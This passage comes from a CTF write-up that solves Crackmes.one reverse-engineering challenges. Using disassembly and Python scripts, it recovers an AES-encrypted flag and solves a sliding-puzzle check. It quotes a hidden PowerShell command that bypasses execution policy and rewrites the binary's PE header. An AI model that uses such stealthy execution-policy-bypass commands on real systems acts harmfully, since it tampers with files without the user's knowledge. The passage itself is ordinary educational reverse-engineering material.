$p=&#x27;</span><br><span class="line"></span><br><span class="line">0x14001B507: </span><br><span class="line">&#x27;; $b=[IO.File]::ReadAllBytes($p);$e=[BitConverter]::ToInt32($b,0x3C);$z=[BitConverter]::GetBytes(0);$z.CopyTo($</span><br><span class="line"></span><br><span class="line">0x14001B610: </span><br><span class="line">b,$e+8);[IO.File]::WriteAllBytes($p,$b)&quot;</span><br><span class="line"></span><br><span class="line">0x14001CF2D: </span><br><span class="line">===============================================================</span><br><span class="line">&gt; Welcome to Flar-... whoops I meant Crackmes.one Reverse Engineering CTF 2026!</span><br><span class="line">&gt; You must only attempt this challenge while the CTF is running.</span><br><span class="line">&gt; Therefore you need to be quick, &#x27;Tempus Fugit&#x27; in the blink of an eye.</span><br><span class="line">&gt; Now listen carefully...</span><br><span class="line">&gt; The wandering time shall not bend,</span><br><span class="line">&gt; Seize it once, or it&#x27;s gone to the end.</span><br><span class="line">&gt; Good luck, fellow traveller. Please save us.  ~&gt;--&gt;--&gt;~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Journal entry from January 19, 2038 by [@heapsoverflow]</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">Press ENTER if you read...</span><br><span class="line"></span><br><span class="line">0x14001D441:</span><br><span class="line">Time&#x27;s up. Every old system switched to 64-bit but at what cost... You can still try though.</span><br><span class="line"></span><br><span class="line">0x14001D554:</span><br><span class="line">This is the last day, my friend. Please hurry...</span><br><span class="line"></span><br><span class="line">0x14001D629:</span><br><span class="line">Still struggling, soldier? You&#x27;ve got plenty of time.</span><br><span class="line"></span><br><span class="line">0x14001D6DA:</span><br><span class="line">Ah yes, you either snuck in to review things before the CTF, or you&#x27;re just playing games with the dates. Very recreational.</span><br><span class="line"></span><br><span class="line">0x14001DB61:</span><br><span class="line">Wrong timing.</span><br><span class="line"></span><br><span class="line">0x14001DBFD:</span><br><span class="line">Wow... Thank you for the effort! *Can you also stop Sam Altman?* Here&#x27;s the flag: </span><br><span class="line"></span><br><span class="line">0x14001F415:</span><br><span class="line">4c4635258cf6eca5d80b8e050a9e5b04f1a9c979bc55f3f4773971ed2f81a96967bb3569fa002f549cc970a18779b3a7</span><br></pre></td></tr></table></figure>

<p>From these strings we can see the right case is at 0x14001DBFD:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.ch:</span>00007FF60465DB31 loc_7FF60465DB31:                       <span class="comment">; CODE XREF: .text:00007FF604644885↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB31 <span class="keyword">lea</span>     <span class="built_in">r8</span>, [<span class="built_in">rbp</span>+<span class="number">420h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB38 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rbp</span>+<span class="number">438h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB3F <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">408h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB46 <span class="keyword">call</span>    loc_7FF60464326C</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB4B <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+<span class="number">408h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB52 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="number">43h</span> <span class="comment">; &#x27;C&#x27;</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB55 <span class="keyword">js</span>      loc_7FF6046448A3</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465DB5B <span class="keyword">jns</span>     loc_7FF6046448A3</span><br><span class="line"><span class="symbol">    </span></span><br><span class="line"><span class="symbol">    .text:</span>00007FF6046448A3 loc_7FF6046448A3:                       <span class="comment">; CODE XREF: .ch:00007FF60465DB27↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448A3                                         <span class="comment">; .ch:00007FF60465DB55↓j ...</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448A3 <span class="keyword">jz</span>      short case_flag</span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448A5 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">1</span>], <span class="number">4Dh</span> <span class="comment">; &#x27;M&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448A9 <span class="keyword">jz</span>      short case_flag</span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448AB <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448AC <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448AD <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448AE <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448AF <span class="keyword">jz</span>      Wrong_timing_1</span><br><span class="line"><span class="symbol">.text:</span>00007FF6046448B5 <span class="keyword">jnz</span>     Wrong_timing_2</span><br></pre></td></tr></table></figure>

<p>Note that at this address, the program is comparing [rax] with “CM” (the flag header), so at this time the flag is already be decrypted. As [rax] is a 48 byte array, and the suspicious 96 character hex, the <code>4c4635258cf6eca5d80b8e050a9e5b04f1a9c979bc55f3f4773971ed2f81a96967bb3569fa002f549cc970a18779b3a7</code> is the cipher without doubt. Add hardware breakpoint to this cipher, and:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.ch:</span>00007FF60466572A <span class="comment">; __int64 __fastcall __far loc_7FF60466572A(void *)</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466572A loc_7FF60466572A:                       <span class="comment">; CODE XREF: .text:00007FF604647BCA↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466572A <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">20h</span>], <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466572F <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665730 <span class="keyword">push</span>    <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665731 <span class="keyword">push</span>    <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665732 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">30h</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665736 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665739 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466573C <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="number">7FFFFFFFFFFFFFFFh</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665746 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665749 <span class="keyword">cmp</span>     <span class="built_in">r8</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466574C <span class="keyword">jle</span>     loc_7FF604647BE6</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665752 <span class="keyword">jg</span>      loc_7FF604647BE6</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665758 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">0FE46AEA0h</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466575D</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466575D loc_7FF60466575D:                       <span class="comment">; CODE XREF: .text:00007FF604647BF2↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466575D <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rsi</span>                        <span class="comment">; void *</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665760 <span class="keyword">mov</span>     [<span class="built_in">rsi</span>+<span class="number">10h</span>], <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665764 <span class="keyword">mov</span>     <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rsi</span>+<span class="number">18h</span>], <span class="number">0Fh</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466576C <span class="keyword">call</span>    memcpy</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665771 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="built_in">rsi</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665775 <span class="keyword">jl</span>      loc_7FF604647C06</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466577B <span class="keyword">jge</span>     loc_7FF604647C06</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665781</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665781 loc_7FF604665781:                       <span class="comment">; CODE XREF: .text:loc_7FF604647C0B↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665781 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665784 <span class="keyword">or</span>      <span class="built_in">rax</span>, <span class="number">0Fh</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665788 <span class="keyword">cmp</span>     <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466578B <span class="keyword">js</span>      loc_7FF604647C12</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665791 <span class="keyword">jns</span>     loc_7FF604647C12</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665797</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665797 loc_7FF604665797:                       <span class="comment">; CODE XREF: .text:00007FF604647C14↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604665797 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">16h</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466579C <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466579F <span class="keyword">cmp</span>     <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF6046657A2 <span class="keyword">cmovb</span>   <span class="built_in">rcx</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF6046657A6 <span class="keyword">jmp</span>     loc_7FF604647C23</span><br></pre></td></tr></table></figure>

<p>At this place the 96 char hex is converted to 48 bytes. And add bp again to the 48 byte:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.ch:</span>00007FF60466347E loc_7FF60466347E:                       <span class="comment">; CODE XREF: .text:00007FF604643320↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466347E <span class="keyword">movups</span>  <span class="built_in">xmm0</span>, xmmword <span class="built_in">ptr</span> [<span class="built_in">rbx</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604663481 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rsp</span>+<span class="number">40h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF604663486 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604663489 <span class="keyword">call</span>    loc_7FF604641498</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60466348E <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF604663493 <span class="keyword">jmp</span>     loc_7FF60464332F</span><br></pre></td></tr></table></figure>

<p>At this place the 48 bytes are read. Moreover, the [rsp+40h] is a string <code>000...&lt;Username&gt;</code> (username is from <code>0x14001D850 call 0x1400033B4</code> and Padding is added at <code>0x14001D8A4 call 0x140003D98</code>). This is just 16 bytes. And debug shows that the array used for comparison after decryption is the result of AES-128-CBC with iv &#x3D; <code>000...&lt;a value related to timestamp&gt;</code> decryption using this string as key. The iv is generated at:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.ch:</span>00007FF60465D9AB loc_7FF60465D9AB:                       <span class="comment">; CODE XREF: .text:00007FF6046447D4↑j</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9AB <span class="keyword">call</span>    loc_7FF604643734</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9B0 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9B2 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9B4 <span class="keyword">lea</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+<span class="number">150h</span>]</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9BB <span class="keyword">call</span>    loc_7FF604647034</span><br><span class="line"><span class="symbol">.ch:</span>00007FF60465D9C0 <span class="keyword">jmp</span>     loc_7FF6046447E3</span><br></pre></td></tr></table></figure>

<p>The <code>loc_7FF604643734</code> returned an int and this int ^ timestamp is the iv’s value. And what this loc returns is the <code>TimeDateStamp</code> of the PE header of this program. Note that above has a powershell script: <code>powershell -executionpolicy bypass -noninteractive -nologo -NoProfile -WindowStyle Hidden -Command &quot;Start-Sleep 1; $p=&#39;&#39;; $b=[IO.File]::ReadAllBytes($p);$e=[BitConverter]::ToInt32($b,0x3C);$z=[BitConverter]::GetBytes(0);$z.CopyTo($b,$e+8);[IO.File]::WriteAllBytes($p,$b)&quot;</code>. This will set the <code>TimeDateStamp</code> to 0. This maybe means the program has only one time to try to run. Anyway, we can find the username in the compilation information of the program:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00007FF60464D590 asc_7FF60464D590 <span class="built_in">db</span> <span class="string">&#x27;RSDS&#x27;</span>              <span class="comment">; DATA XREF: .rdata:00007FF60464C5F4↑o</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D590                                         <span class="comment">; CV signature</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D594                 GUID &lt;<span class="number">0</span>&gt;                <span class="comment">; GUID</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D5A4                 <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; Age</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D5A8                 text <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&#x27;C:\Users\nicetryboogeyman\cmo\x64\Release\cmo.pdb&#x27;</span>,<span class="number">0</span>,<span class="number">0</span> <span class="comment">; PdbFileName</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D5DB                 text <span class="string">&quot;UTF-8&quot;</span>, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF60464D5F7                 text <span class="string">&quot;UTF-8&quot;</span>, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>And try a value near 0x20000000 (this is the result range obtained by XORing the original TimeDateStamp of the program around February 17~18th) as iv to decrypt:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4c4635258cf6eca5d80b8e050a9e5b04f1a9c979bc55f3f4773971ed2f81a96967bb3569fa002f549cc970a18779b3a7&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;nicetryboogeyman&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;0000000536870912&quot;</span></span><br><span class="line"></span><br><span class="line">pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt[:-<span class="number">3</span>].decode(<span class="string">&quot;ascii&quot;</span>)) <span class="comment"># CMO&#123;5h3_p5[uW8w^t0_l34rn_fr0M_n0T_t0_l1V3_1n&#125;</span></span><br></pre></td></tr></table></figure>

<p>This is very close to the flag. After fine-tuning, the correct IV can be obtained as <code>0000000537068053</code>.</p>
<p><font color=deepskyblue><strong>CMO{5h3_p4St_1s_t0_l34rn_fr0M_n0T_t0_l1V3_1n}</strong></font></p>
<h2 id="Hard"><a href="#Hard" class="headerlink" title="Hard"></a>Hard</h2><h3 id="wallpaper"><a href="#wallpaper" class="headerlink" title="wallpaper"></a>wallpaper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> heappush, heappop</span><br><span class="line"></span><br><span class="line">START_STATE = <span class="number">0xB6FD071E9C8A3425</span></span><br><span class="line">GOAL_STATE  = <span class="number">0xFEDCBA9876543210</span></span><br><span class="line">MOVE_OFF = &#123;<span class="number">0</span>: -<span class="number">4</span>, <span class="number">1</span>: -<span class="number">1</span>, <span class="number">2</span>: +<span class="number">4</span>, <span class="number">3</span>: +<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nibbles_u64</span>(<span class="params">x: <span class="built_in">int</span></span>): <span class="keyword">return</span> <span class="built_in">tuple</span>((x &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u64_from_nibbles</span>(<span class="params">nibs</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(nibs): x |= (v &amp; <span class="number">0xF</span>) &lt;&lt; (<span class="number">4</span> * i)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manhattan</span>(<span class="params">state, goal_pos</span>):</span><br><span class="line">    dist = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(state):</span><br><span class="line">        <span class="keyword">if</span> val == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        gi = goal_pos[val]</span><br><span class="line">        r1, c1 = <span class="built_in">divmod</span>(idx, <span class="number">4</span>)</span><br><span class="line">        r2, c2 = <span class="built_in">divmod</span>(gi, <span class="number">4</span>)</span><br><span class="line">        dist += <span class="built_in">abs</span>(r1 - r2) + <span class="built_in">abs</span>(c1 - c2)</span><br><span class="line">    <span class="keyword">return</span> dist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">legal_moves</span>(<span class="params">blank_idx: <span class="built_in">int</span></span>):</span><br><span class="line">    r, c = <span class="built_in">divmod</span>(blank_idx, <span class="number">4</span>)</span><br><span class="line">    ds = []</span><br><span class="line">    <span class="keyword">if</span> r &gt; <span class="number">0</span>: ds.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> c &gt; <span class="number">0</span>: ds.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">3</span>: ds.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> c &lt; <span class="number">3</span>: ds.append(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> ds</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">neighbors</span>(<span class="params">state</span>):</span><br><span class="line">    z = state.index(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> legal_moves(z):</span><br><span class="line">        nz = z + MOVE_OFF[d]</span><br><span class="line">        s2 = <span class="built_in">list</span>(state)</span><br><span class="line">        s2[z], s2[nz] = s2[nz], s2[z]</span><br><span class="line">        <span class="keyword">yield</span> <span class="built_in">tuple</span>(s2), d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">astar</span>(<span class="params">start, goal</span>):</span><br><span class="line">    goal_pos = &#123;v: i <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(goal)&#125;</span><br><span class="line">    h0 = manhattan(start, goal_pos)</span><br><span class="line">    pq = []</span><br><span class="line">    heappush(pq, (h0, <span class="number">0</span>, start))</span><br><span class="line">    came = &#123;start: (<span class="literal">None</span>, <span class="literal">None</span>)&#125;</span><br><span class="line">    gscore = &#123;start: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> pq:</span><br><span class="line">        f, g, s = heappop(pq)</span><br><span class="line">        <span class="keyword">if</span> s == goal:</span><br><span class="line">            path = []</span><br><span class="line">            cur = s</span><br><span class="line">            <span class="keyword">while</span> came[cur][<span class="number">0</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                prev, d = came[cur]</span><br><span class="line">                path.append(d)</span><br><span class="line">                cur = prev</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">        <span class="keyword">if</span> g != gscore[s]: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> ns, d <span class="keyword">in</span> neighbors(s):</span><br><span class="line">            ng = g + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ns <span class="keyword">not</span> <span class="keyword">in</span> gscore <span class="keyword">or</span> ng &lt; gscore[ns]:</span><br><span class="line">                gscore[ns] = ng</span><br><span class="line">                came[ns] = (s, d)</span><br><span class="line">                heappush(pq, (ng + manhattan(ns, goal_pos), ng, ns))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_moves</span>(<span class="params">state, digits</span>):</span><br><span class="line">    st = <span class="built_in">list</span>(state)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> digits:</span><br><span class="line">        d = <span class="built_in">int</span>(ch)</span><br><span class="line">        z = st.index(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> legal_moves(z): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        nz = z + MOVE_OFF[d]</span><br><span class="line">        st[z], st[nz] = st[nz], st[z]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(st)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = nibbles_u64(START_STATE)</span><br><span class="line">    goal  = nibbles_u64(GOAL_STATE)</span><br><span class="line">    path = astar(start, goal)</span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">raise</span> SystemExit(<span class="string">&quot;No solution found&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> path)</span><br><span class="line">    end = apply_moves(start, s)</span><br><span class="line">    <span class="keyword">if</span> end != goal: <span class="keyword">raise</span> SystemExit(<span class="string">&quot;Internal check failed&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>CMO{1012321103210033011233322110103321001}</strong></font></p>
<h3 id="Matryoshka-v2"><a href="#Matryoshka-v2" class="headerlink" title="Matryoshka v2"></a>Matryoshka v2</h3><p>The program’s logic is very simple:</p>
